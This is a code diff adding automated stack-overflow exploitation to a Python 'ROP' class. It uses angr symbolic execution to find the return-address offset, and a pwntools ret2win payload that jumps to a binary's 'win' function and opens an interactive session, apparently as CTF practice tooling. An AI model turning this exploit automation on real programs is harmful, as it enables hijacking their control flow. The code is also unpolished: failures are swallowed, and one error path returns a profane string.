@@ -1,14 +1,20 @@
+from pwn import *
+import angr, claripy
 
 class ROP:
     def __init__(self, filename, properties):
         self.filename = filename
         self.properties = properties
+        self.offset = Get2overflow(filename).buf()
+        self.e = ELF(filename)
+        self.p = process(filename)
 
     def ret2win(self):
-        pass
+        payload = cyclic(self.offset)
+        payload += p64(self.e.sym["win"])
+        self.p.sendline(payload)
+        self.p.interactive()
 
-    def ret2system(self):
-        pass
 
     def ret2execve(self):
         pass
@@ -19,3 +25,44 @@ class ROP:
     def supporting_functions_here(self):
         print("example support function")
 
+class Get2overflow:
+    def __init__(s, binary):
+        s.elf = context.binary =  ELF(binary)
+        s.proj = angr.Project(binary)
+        start_addr = s.elf.sym["main"]
+        # Maybe change to symbolic file stream
+        buff_size = 1024
+        s.symbolic_input = claripy.BVS("input", 8 * buff_size)
+        s.symbolic_padding = None
+
+        s.state = s.proj.factory.blank_state(
+                addr=start_addr,
+                stdin=s.symbolic_input
+        )
+        s.simgr = s.proj.factory.simgr(s.state, save_unconstrained=True)
+        s.simgr.stashes["mem_corrupt"] = []
+
+        s.simgr.explore(step_func=s.check_mem_corruption)
+
+    def check_mem_corruption(s, simgr):
+        if len(simgr.unconstrained) > 0:
+            for path in simgr.unconstrained:
+                path.add_constraints(path.regs.pc == b"AAAAAAAA")
+                if path.satisfiable():
+                    stack_smash = path.solver.eval(s.symbolic_input, cast_to=bytes)
+                    try:
+                        index = stack_smash.index(b"AAAAAAAA")
+                        s.symbolic_padding = stack_smash[:index]
+                        simgr.stashes["mem_corrupt"].append(path)
+                    except:
+                        print("do a thing")
+                simgr.stashes["unconstrained"].remove(path)
+                simgr.drop(stash="active")
+
+        return simgr
+
+    def buf(s):
+        try:
+            return len(s.symbolic_padding)
+        except:
+            return "Fuck"
